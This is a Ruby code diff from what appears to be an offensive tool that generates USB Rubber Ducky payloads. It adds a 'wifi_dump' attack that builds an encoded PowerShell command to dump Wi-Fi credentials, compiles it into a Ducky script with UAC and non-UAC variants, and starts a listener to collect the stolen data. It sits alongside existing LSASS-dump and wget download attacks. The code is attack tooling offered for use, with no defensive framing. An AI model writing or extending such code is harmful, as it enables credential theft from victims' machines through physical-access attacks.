@@ -20,6 +20,17 @@ def server(attack)
     port = @server_setup.get_port
     powershell_command1,powershell_command2 = powershell_lsass_dump(host,port)
     return host,port,powershell_command1,powershell_command2
+  elsif attack == 'wifi_dump'
+    port = @server_setup.get_port
+    random_name_answer = [(get_input('Would you like to randomize the folder name?[yes/no] ') ), $stdin.gets.rstrip][1]
+    if random_name_answer == 'yes'
+      print_info("Creating Random Name!\n")
+      random_name = random_name_gen
+      powershell_command = powershell_wifi_dump(host,port,random_name)
+    else
+      powershell_command = powershell_wifi_dump(host,port)
+    end
+    return port,powershell_command
   elsif attack == 'wget'
     file_path = [(get_input('Enter full path to executable: ') ), $stdin.gets.rstrip][1]
     file_name = file_path.split('/')[-1]
@@ -74,6 +85,10 @@ def start_lsass_server(port)
   lsass = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
   lsass == 'yes' ? @server_setup.lsass_server(port) : print_info("Goody Bye!\n")
 end
+def start_wifi_server(port)
+  wifi = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
+  wifi == 'yes' ? @server_setup.wifi_server(port) : print_info("Goody Bye!\n")
+end
 def case_main_menu
   answer = main_menu
   case answer
@@ -84,8 +99,10 @@ def case_main_menu
     when '3'
       case_dump_lsass_menu
     when '4'
-      case_wget_menu
+      case_dump_wifi_menu
     when '5'
+      case_wget_menu
+    when '6'
       case_hex_to_bin_menu
     when '99'
       exit
@@ -172,7 +189,31 @@ def case_dump_lsass_menu
       case_dump_lsass_menu
   end 
 end
-def case_wget_menu
+def case_dump_wifi_menu
+  attack = 'wifi_dump'
+  dump_wifi_answer = dump_wifi_menu
+  case dump_wifi_answer
+    when '1'
+      port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port)
+    when '2'
+      port,powershell_command = server(attack)
+      print_info("Creating Text File!\n")
+      ducky_wifi_no_uac(encode_command(powershell_command))
+      compile_ducky(wifi_dump_file)
+      start_wifi_server(port)
+    when '99'
+      case_main_menu
+    else
+      print_error('Bad Choice')
+      sleep(1)
+      case_dump_wifi_menu
+    end
+  end
+  def case_wget_menu
   attack = 'wget'
   ServerSetUp.new.web_server
   wget_answer = powershell_wget_menu
